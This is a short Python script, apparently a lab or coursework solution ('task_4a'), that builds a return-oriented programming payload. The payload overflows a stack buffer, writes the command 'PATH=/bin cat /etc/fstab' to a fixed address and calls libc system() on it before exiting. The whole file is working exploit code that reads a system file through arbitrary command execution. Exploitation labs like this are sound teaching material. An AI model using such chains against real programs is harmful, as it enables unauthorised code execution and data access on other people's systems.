#!/usr/bin/env python3
import sys
from common import *

def task_4a():
    addr = 0x403160
    system_arg = "PATH=/bin cat /etc/fstab"

    rop = b""
    rop += arbitrary_write_chain(addr, system_arg)

    # align, if necessary after the write chain.
    rop = do_align(rop)

    # call system("PATH=/bin ...") then exit(0).
    rop += call_libc_chain("getline", "system", rdi = addr)
    rop += call_libc_chain("system", "exit", rdi = 0)

    # prepend stack garbage and append newline.
    rop = GARBAGE_BYTES + rop + b"\n"
    sys.stdout.buffer.write(rop)

if __name__ == "__main__":
    task_4a()
